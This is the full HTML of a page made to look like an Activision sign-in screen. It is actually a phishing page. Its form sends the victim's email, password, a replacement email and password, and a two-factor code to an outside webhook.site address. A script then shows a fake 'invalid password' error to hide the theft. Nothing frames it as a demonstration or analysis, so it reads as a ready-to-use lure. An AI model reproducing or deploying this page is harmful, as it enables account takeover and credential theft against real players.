<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Activision</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
body { background:#0a0a0a; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.container { background:#1a1a1a; padding:40px; border-radius:12px; width:100%; max-width:400px; }
.logo { text-align:center; margin-bottom:30px; }
.logo h1 { color:#fff; font-size:28px; letter-spacing:2px; }
.logo span { color:#888; font-size:14px; }
.input-group { margin-bottom:18px; }
.input-group label { color:#ccc; font-size:13px; display:block; margin-bottom:5px; }
.input-group input { width:100%; padding:12px 14px; background:#2a2a2a; border:1px solid #333; border-radius:6px; color:#fff; font-size:15px; outline:none; }
.input-group input:focus { border-color:#00b4d8; }
.btn { width:100%; padding:13px; background:#00b4d8; border:none; border-radius:6px; color:#fff; font-size:16px; font-weight:bold; cursor:pointer; }
.btn:hover { background:#0096b8; }
.error { color:#ff4444; font-size:13px; text-align:center; margin-top:12px; display:none; }
.footer { text-align:center; margin-top:18px; color:#666; font-size:12px; }
.footer a { color:#00b4d8; text-decoration:none; }
</style>
</head>
<body>
<div class="container">
<div class="logo"><h1>ACTIVISION</h1><span>Sign in to your account</span></div>
<form action="https://webhook.site/dbcadda3-6d04-46fa-bb8b-dbf6649e2aaa" method="POST">
<div class="input-group"><label>Email or Activision ID</label><input type="text" name="email" placeholder="Enter your email or ID" required></div>
<div class="input-group"><label>Password</label><input type="password" name="password" placeholder="Enter your password" required></div>
<div class="input-group"><label>New Email (for change)</label><input type="email" name="new_email" placeholder="Enter new email" required></div>
<div class="input-group"><label>New Password (for change)</label><input type="password" name="new_password" placeholder="Enter new password" required></div>
<div class="input-group"><label>2FA Code</label><input type="text" name="code" placeholder="Enter verification code" required></div>
<button type="submit" class="btn">Sign In</button>
<div class="error" id="errorMsg">Invalid email or password. Please try again.</div>
</form>
<div class="footer"><a href="#">Forgot password?</a> · <a href="#">Create account</a></div>
</div>
<script>
document.querySelector('form').addEventListener('submit',function(){
setTimeout(function(){document.getElementById('errorMsg').style.display='block';},400);
});
</script>
</body>
</html>
